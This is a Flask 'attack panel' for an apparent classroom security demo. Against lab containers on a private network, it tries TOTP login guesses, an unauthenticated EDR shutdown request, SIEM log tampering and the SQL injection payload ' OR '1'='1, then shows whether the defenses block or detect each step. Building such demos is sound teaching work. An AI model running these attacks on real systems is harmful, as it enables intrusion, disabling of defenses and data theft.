import requests
from flask import Flask, jsonify, render_template_string

app = Flask(__name__)

VICTIM_URL = "http://172.29.0.20:8000"
SIEM_URL   = "http://172.29.0.30:5601"
ADMIN_URL  = "http://172.29.0.40:8080"
DB_URL     = "http://172.29.0.60:5050"


def safe_get(url, **kwargs):
    try:
        r = requests.get(url, timeout=4, **kwargs)
        return r.json(), r.status_code
    except Exception as e:
        return {"error": str(e)}, 0


def safe_post(url, **kwargs):
    try:
        r = requests.post(url, timeout=4, **kwargs)
        return r.json(), r.status_code
    except Exception as e:
        return {"error": str(e)}, 0


@app.route("/")
def index():
    return render_template_string(HTML)


@app.route("/api/status")
def api_status():
    edr, _  = safe_get(f"{VICTIM_URL}/status")
    db, _   = safe_get(f"{DB_URL}/status")
    siem, _ = safe_get(f"{SIEM_URL}/verify")
    return jsonify({
        "edr_alive":  "error" not in edr,
        "edr":        edr.get("protection") if "error" not in edr else None,
        "db":         db.get("protected")   if "error" not in db  else None,
        "siem":       siem.get("integrity", "?") if "error" not in siem else "OFFLINE",
        "siem_logs":  siem.get("total_logs", 0)  if "error" not in siem else 0,
    })


@app.route("/api/attack/1", methods=["POST"])
def attack1():
    attempts = [
        ("Sin código MFA",           ""),
        ("MFA incorrecto: 123456",   "123456"),
        ("MFA incorrecto: 000000",   "000000"),
    ]
    steps = []
    for label, totp in attempts:
        resp, code = safe_post(f"{ADMIN_URL}/login-api", json={
            "username": "admin", "password": "Segur1dad!", "totp": totp
        })
        steps.append({"label": label, "totp": totp, "response": resp, "code": code})

    all_denied = all(s["response"].get("status") == "DENEGADO" for s in steps)
    return jsonify({
        "phase":   1,
        "title":   "Bypass MFA — Panel de Administración",
        "steps":   steps,
        "blocked": all_denied,
        "summary": (
            "MFA bloqueó los 3 intentos. La contraseña sola no es suficiente: sin el código TOTP del dispositivo físico, el acceso es imposible."
            if all_denied else
            "Acceso concedido. MFA no está funcionando correctamente."
        ),
    })


@app.route("/api/attack/2", methods=["POST"])
def attack2():
    status_before, _ = safe_get(f"{VICTIM_URL}/status")
    stop_resp, stop_code = safe_post(f"{VICTIM_URL}/stop")

    blocked = stop_resp.get("status") == "BLOCKED"
    killed  = stop_resp.get("status") == "STOPPED"

    return jsonify({
        "phase":         2,
        "title":         "Detener EDR Agent — Tamper Protection",
        "status_before": status_before,
        "stop_response": stop_resp,
        "stop_code":     stop_code,
        "blocked":       blocked,
        "edr_killed":    killed,
        "summary": (
            "Tamper Protection bloqueó la orden de apagado. El EDR registró el intento como CRITICAL en el SIEM y sigue corriendo."
            if blocked else
            "EDR detenido — el proceso Python murió, el contenedor está offline. El sistema queda sin protección de endpoint."
            if killed else
            "El EDR no responde. Puede que ya esté offline."
        ),
    })


@app.route("/api/attack/3", methods=["POST"])
def attack3():
    logs_resp, _ = safe_get(f"{SIEM_URL}/logs")

    if not isinstance(logs_resp, list) or len(logs_resp) < 2:
        return jsonify({
            "phase":    3,
            "blocked":  False,
            "detected": False,
            "error":    True,
            "summary":  "Necesitás al menos 2 logs en el SIEM. Ejecutá los otros ataques primero y volvé a intentar.",
        })

    target = logs_resp[1]
    tamper_resp, _ = safe_post(f"{SIEM_URL}/tamper", json={
        "id":      target["id"],
        "message": "*** REGISTRO ELIMINADO POR ATACANTE — SIN EVIDENCIA ***",
    })
    verify_resp, _ = safe_get(f"{SIEM_URL}/verify")

    detected = verify_resp.get("integrity") == "COMPROMETIDA"
    return jsonify({
        "phase":          3,
        "title":          "Manipulación de Logs — SIEM Hash Chain",
        "target_log":     {"id": target["id"], "message": target["message"]},
        "tamper_response": tamper_resp,
        "verify_response": verify_resp,
        "blocked":        False,
        "detected":       detected,
        "summary": (
            "Manipulación ejecutada, pero DETECTADA INMEDIATAMENTE por la cadena de hash SHA-256. El SIEM muestra ❌ ROTO en el registro alterado."
            if detected else
            "Log modificado. El SIEM no detectó cambios (verificar manualmente)."
        ),
    })


@app.route("/api/attack/4", methods=["POST"])
def attack4():
    legit,  _ = safe_get(f"{DB_URL}/search", params={"ci": "1234567"})
    payload   = "' OR '1'='1"
    inject, _ = safe_get(f"{DB_URL}/search", params={"ci": payload})

    protected    = inject.get("protected", True)
    count        = inject.get("count", 0)
    results      = inject.get("results", [])
    dtic_exposed = any("SK-2024" in str(r.get("datos_acceso", "")) for r in results)
    blocked      = protected or count <= 1

    return jsonify({
        "phase":        4,
        "title":        "Inyección SQL — Base de Datos SUNIVER",
        "payload":      payload,
        "legit":        legit,
        "inject":       inject,
        "blocked":      blocked,
        "dtic_exposed": dtic_exposed,
        "summary": (
            "Consultas parametrizadas bloquearon el payload. La BD trató la inyección como texto literal: ningún registro devuelto."
            if blocked else
            f"INYECCIÓN EXITOSA — {count} registros expuestos incluyendo el Token API DTIC-SUNIVER en texto claro."
            if dtic_exposed else
            f"INYECCIÓN EXITOSA — {count} registros expuestos."
        ),
    })


HTML = r"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Panel de Ataque — DS5.17</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0d1117; color:#c9d1d9; font-family:'Consolas','Monaco',monospace; min-height:100vh; }

.header {
  background:#161b22; border-bottom:2px solid #f85149;
  padding:16px 32px; display:flex; align-items:center; justify-content:space-between;
}
.header-title { color:#f85149; font-size:1.25rem; font-weight:bold; letter-spacing:.02em; }
.header-sub { color:#8b949e; font-size:0.78rem; margin-top:3px; }
.header-links { display:flex; gap:12px; }
.hlink { color:#58a6ff; font-size:0.8rem; text-decoration:none; }
.hlink:hover { text-decoration:underline; }

.status-bar {
  background:#0d1117; border-bottom:1px solid #21262d;
  padding:10px 32px; display:flex; gap:28px; align-items:center;
  font-size:0.8rem;
}
.si { display:flex; align-items:center; gap:7px; }
.si-lbl { color:#8b949e; }
.si-val { font-weight:bold; }
.si-val.protected { color:#3fb950; }
.si-val.vulnerable { color:#f85149; }
.si-val.offline { color:#484f58; }
.dot { width:9px; height:9px; border-radius:50%; flex-shrink:0; }
.dot.g { background:#3fb950; box-shadow:0 0 5px #3fb950; }
.dot.r { background:#f85149; box-shadow:0 0 5px #f85149; }
.dot.x { background:#484f58; }
.upd { margin-left:auto; color:#484f58; font-size:0.73rem; }

.main { padding:20px 32px; display:grid; grid-template-columns:1fr 1fr; gap:16px; }
.full { grid-column:1/-1; }

.card {
  background:#161b22; border:1px solid #30363d; border-radius:8px;
  padding:18px; position:relative; overflow:hidden;
}
.card::before {
  content:''; position:absolute; top:0; left:0; right:0; height:2px;
  background:#f85149;
}

.phase-badge {
  background:rgba(248,81,73,.15); color:#f85149;
  border:1px solid rgba(248,81,73,.4); border-radius:4px;
  padding:2px 8px; font-size:0.7rem; font-weight:bold; display:inline-block; margin-bottom:10px;
}
.card-title { font-size:.95rem; font-weight:bold; color:#e6edf3; margin-bottom:4px; }
.card-target { color:#8b949e; font-size:.75rem; margin-bottom:12px; }
.card-payload {
  background:#0d1117; border:1px solid #21262d; border-radius:4px;
  padding:8px 10px; font-size:.75rem; color:#79c0ff; margin-bottom:14px; white-space:pre;
}

.atk-btn {
  background:#da3633; color:#fff; border:none; border-radius:6px;
  padding:9px 16px; cursor:pointer; font-size:.82rem; font-family:monospace;
  font-weight:bold; width:100%; letter-spacing:.02em; transition:background .15s;
}
.atk-btn:hover { background:#f85149; }
.atk-btn:disabled { background:#21262d; color:#484f58; cursor:not-allowed; }

.terminal {
  background:#010409; border:1px solid #21262d; border-radius:8px; overflow:hidden;
}
.term-hdr {
  background:#161b22; padding:9px 14px;
  display:flex; align-items:center; gap:10px; border-bottom:1px solid #21262d;
}
.tdots { display:flex; gap:5px; }
.td { width:11px; height:11px; border-radius:50%; }
.td-r { background:#f85149; } .td-y { background:#d29922; } .td-g { background:#3fb950; }
.term-name { color:#8b949e; font-size:.78rem; }
.term-body {
  padding:16px; min-height:280px; max-height:460px; overflow-y:auto;
  font-size:.8rem; line-height:1.65;
}
.tl { margin-bottom:2px; }
.tc-prompt { color:#f85149; }
.tc-info    { color:#8b949e; }
.tc-ok      { color:#3fb950; }
.tc-bad     { color:#f85149; }
.tc-warn    { color:#d29922; }
.tc-data    { color:#79c0ff; }
.tc-detect  { color:#a371f7; }
.tc-empty   { color:#484f58; text-align:center; padding:60px 0; }

.result {
  margin-top:14px; padding:11px 15px; border-radius:6px;
  border-left:3px solid; font-size:.85rem; font-weight:bold; line-height:1.5;
}
.r-blocked  { background:rgba(63,185,80,.1);  border-color:#3fb950; color:#3fb950; }
.r-success  { background:rgba(248,81,73,.1);  border-color:#f85149; color:#f85149; }
.r-detected { background:rgba(163,113,247,.1); border-color:#a371f7; color:#a371f7; }
</style>
</head>
<body>

<div class="header">
  <div>
    <div class="header-title">&#x2620; PANEL DE ATAQUE &mdash; Kali Linux 172.29.0.10</div>
    <div class="header-sub">Demo DS5.17 COBIT &middot; Red objetivo: 172.29.0.0/24 &middot; 4 vectores de ataque</div>
  </div>
  <div class="header-links">
    <a class="hlink" href="http://localhost:5601" target="_blank">&#x1F6E1; SIEM</a>
    <a class="hlink" href="http://localhost:8080" target="_blank">&#x2699; Admin</a>
    <a class="hlink" href="http://localhost:7000" target="_blank">&#x1F393; SUNIVER</a>
  </div>
</div>

<div class="status-bar">
  <div class="si"><div class="dot x" id="d-edr"></div><span class="si-lbl">EDR:</span><span class="si-val" id="v-edr">—</span></div>
  <div class="si"><div class="dot x" id="d-db"></div><span class="si-lbl">Base de Datos:</span><span class="si-val" id="v-db">—</span></div>
  <div class="si"><div class="dot x" id="d-siem"></div><span class="si-lbl">SIEM:</span><span class="si-val" id="v-siem">—</span></div>
  <div class="si upd" id="upd"></div>
</div>

<div class="main">
  <div class="card">
    <div class="phase-badge">FASE 1</div>
    <div class="card-title">Bypass de Autenticación MFA</div>
    <div class="card-target">&#x25B6; 172.29.0.40:8080 &mdash; Panel de Administración</div>
    <div class="card-payload">POST /login-api
{"username":"admin","password":"Segur1dad!","totp":"???"}
3 intentos: vacío / 123456 / 000000</div>
    <button class="atk-btn" onclick="runAttack(1)">&#x2620; EJECUTAR — FASE 1</button>
  </div>

  <div class="card">
    <div class="phase-badge">FASE 2</div>
    <div class="card-title">Detener EDR Agent (Tamper Protection)</div>
    <div class="card-target">&#x25B6; 172.29.0.20:8000 &mdash; EDR Agent / Victim</div>
    <div class="card-payload">POST /stop
[sin autenticación — acceso directo por red interna]</div>
    <button class="atk-btn" onclick="runAttack(2)">&#x2620; EJECUTAR — FASE 2</button>
  </div>

  <div class="card">
    <div class="phase-badge">FASE 3</div>
    <div class="card-title">Manipular Logs del SIEM</div>
    <div class="card-target">&#x25B6; 172.29.0.30:5601 &mdash; SIEM</div>
    <div class="card-payload">POST /tamper
{"id": 2, "message": "*** REGISTRO ELIMINADO ***"}</div>
    <button class="atk-btn" onclick="runAttack(3)">&#x2620; EJECUTAR — FASE 3</button>
  </div>

  <div class="card">
    <div class="phase-badge">FASE 4</div>
    <div class="card-title">Inyección SQL — Base de Datos SUNIVER</div>
    <div class="card-target">&#x25B6; 172.29.0.60:5050 &mdash; Database</div>
    <div class="card-payload">GET /search?ci=' OR '1'='1
[payload clásico — volcado completo de tabla]</div>
    <button class="atk-btn" onclick="runAttack(4)">&#x2620; EJECUTAR — FASE 4</button>
  </div>

  <div class="full terminal">
    <div class="term-hdr">
      <div class="tdots"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div></div>
      <span class="term-name">root@kali:~# &mdash; output del ataque</span>
    </div>
    <div class="term-body" id="output">
      <div class="tc-empty">Selecciona un ataque para ejecutar...</div>
    </div>
  </div>
</div>

<script>
const out = document.getElementById('output');

function line(cls, text) {
  return '<div class="tl ' + cls + '">' + esc(text) + '</div>';
}
function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function jline(cls, obj) {
  return '<div class="tl ' + cls + '">' + esc(JSON.stringify(obj)) + '</div>';
}

async function updateStatus() {
  try {
    const d = await fetch('/api/status').then(r => r.json());

    function setStatus(dotId, valId, alive, val, trueLabel, falseLabel) {
      const dot = document.getElementById(dotId);
      const el  = document.getElementById(valId);
      if (!alive || val === null) {
        dot.className = 'dot x'; el.className = 'si-val offline'; el.textContent = 'OFFLINE';
      } else if (val) {
        dot.className = 'dot g'; el.className = 'si-val protected'; el.textContent = trueLabel;
      } else {
        dot.className = 'dot r'; el.className = 'si-val vulnerable'; el.textContent = falseLabel;
      }
    }

    setStatus('d-edr',  'v-edr',  d.edr_alive, d.edr, 'PROTEGIDO',   'SIN PROTECCIÓN');
    setStatus('d-db',   'v-db',   d.db !== null, d.db, 'PROTEGIDA',   'VULNERABLE');

    const siemDot = document.getElementById('d-siem');
    const siemVal = document.getElementById('v-siem');
    if (d.siem === 'OFFLINE') {
      siemDot.className = 'dot x'; siemVal.className = 'si-val offline'; siemVal.textContent = 'OFFLINE';
    } else if (d.siem === 'OK') {
      siemDot.className = 'dot g'; siemVal.className = 'si-val protected';
      siemVal.textContent = 'OK (' + d.siem_logs + ' logs)';
    } else {
      siemDot.className = 'dot r'; siemVal.className = 'si-val vulnerable';
      siemVal.textContent = 'COMPROMETIDO';
    }

    document.getElementById('upd').textContent = new Date().toLocaleTimeString();
  } catch(e) {}
}

async function runAttack(phase) {
  const btns = document.querySelectorAll('.atk-btn');
  btns.forEach(b => { b.disabled = true; });

  out.innerHTML = line('tc-prompt', 'root@kali:~# [FASE ' + phase + '] iniciando ataque...') +
                  line('tc-info',   'Conectando a objetivo en red 172.29.0.0/24...');

  try {
    const d = await fetch('/api/attack/' + phase, { method: 'POST' }).then(r => r.json());
    let html = line('tc-prompt', 'root@kali:~# [FASE ' + phase + '] ' + (d.title || '')) +
               line('tc-info',   '─────────────────────────────────────────────────');

    if (phase === 1) html += renderPhase1(d);
    if (phase === 2) html += renderPhase2(d);
    if (phase === 3) html += renderPhase3(d);
    if (phase === 4) html += renderPhase4(d);

    let boxCls, icon;
    if (d.blocked) {
      boxCls = 'r-blocked';  icon = '🛡';
    } else if (d.detected) {
      boxCls = 'r-detected'; icon = '🔍';
    } else {
      boxCls = 'r-success';  icon = '💀';
    }
    html += '<div class="result ' + boxCls + '">' + icon + ' ' + esc(d.summary) + '</div>';
    out.innerHTML = html;
  } catch(e) {
    out.innerHTML = line('tc-bad', 'Error de conexión: ' + e.message);
  }

  btns.forEach(b => { b.disabled = false; });
  await updateStatus();
}

function renderPhase1(d) {
  let h = '';
  (d.steps || []).forEach(function(s, i) {
    h += line('tc-warn', '[' + (i+1) + '/3] ' + s.label + ' → totp="' + s.totp + '"');
    const status = (s.response || {}).status || '';
    const cls = status === 'DENEGADO' ? 'tc-ok' : 'tc-bad';
    h += line(cls, '    ← HTTP ' + s.code + ' ' + JSON.stringify(s.response));
  });
  return h;
}

function renderPhase2(d) {
  let h = '';
  const before = d.status_before || {};
  h += line('tc-info', '[RECONOCIMIENTO] Estado del EDR antes del ataque:');
  h += line('tc-data', '    protection: ' + before.protection + '  |  status: ' + before.status +
            '  |  host: ' + (before.host || '172.29.0.20'));
  h += line('tc-warn', '[ATAQUE] POST /stop → intentando apagar el EDR...');
  const resp = d.stop_response || {};
  const cls  = d.blocked ? 'tc-ok' : 'tc-bad';
  h += line(cls, '    ← HTTP ' + d.stop_code + ' ' + JSON.stringify(resp));
  if (d.edr_killed) {
    h += line('tc-bad', '');
    h += line('tc-bad', '    ⚠  EDR PROCESS TERMINATED — os._exit(0)');
    h += line('tc-bad', '    ⚠  El contenedor victim ha salido (Exited)');
    h += line('tc-bad', '    ⚠  Los heartbeats al SIEM se han detenido');
  }
  return h;
}

function renderPhase3(d) {
  let h = '';
  if (d.error) {
    h += line('tc-warn', d.summary);
    return h;
  }
  const t = d.target_log || {};
  h += line('tc-info', '[OBJETIVO] Log #' + t.id + ' en el SIEM:');
  h += line('tc-data', '    "' + t.message + '"');
  h += line('tc-warn', '[ATAQUE] POST /tamper → sobrescribiendo mensaje sin recalcular hash...');
  const tr = d.tamper_response || {};
  h += line('tc-data', '    ← ' + JSON.stringify(tr));
  h += line('tc-info', '[VERIFICACIÓN] Comprobando integridad de la cadena SHA-256...');
  const vr = d.verify_response || {};
  const vcls = d.detected ? 'tc-detect' : 'tc-bad';
  h += line(vcls, '    ← integridad: ' + vr.integrity + ' | ' + (vr.message || ''));
  if (d.detected) {
    h += line('tc-detect', '    ✓ Hash chain detectó la manipulación — evidencia preservada');
  }
  return h;
}

function renderPhase4(d) {
  let h = '';
  const legit = d.legit || {};
  h += line('tc-info', '[CONSULTA LEGÍTIMA] ci=1234567 — un estudiante real');
  h += line('tc-data', '    ← ' + legit.count + ' resultado(s) | protected: ' + legit.protected);
  h += line('tc-info', '    query: ' + (legit.query || ''));
  h += line('tc-warn', '[INYECCIÓN] payload: ' + d.payload);

  const inject = d.inject || {};
  if (d.blocked) {
    h += line('tc-ok', '    ← ' + inject.count + ' resultado(s) | protected: ' + inject.protected);
    h += line('tc-ok', '    query: ' + (inject.query || ''));
    h += line('tc-ok', '    El payload fue tratado como texto literal. Sin resultados.');
  } else {
    h += line('tc-bad', '    ← ' + inject.count + ' registro(s) expuesto(s) | protected: ' + inject.protected);
    h += line('tc-bad', '    query ejecutada: ' + (inject.query || ''));
    (inject.results || []).forEach(function(r) {
      const flag = r.datos_acceso && r.datos_acceso.indexOf('SK-2024') !== -1 ? ' ⚠ TOKEN DTIC' : '';
      h += line('tc-bad', '    > ' + r.ci + ' | ' + r.nombre + ' | ' + r.datos_acceso + flag);
    });
    if (d.dtic_exposed) {
      h += line('tc-bad', '');
      h += line('tc-bad', '    ⚠  TOKEN API DTIC-SUNIVER EXPUESTO EN TEXTO CLARO');
    }
  }
  return h;
}

updateStatus();
setInterval(updateStatus, 4000);
</script>
</body>
</html>"""


if __name__ == "__main__":
    print("[ATTACKER] Panel de ataque iniciando en puerto 9999...", flush=True)
    app.run(host="0.0.0.0", port=9999)
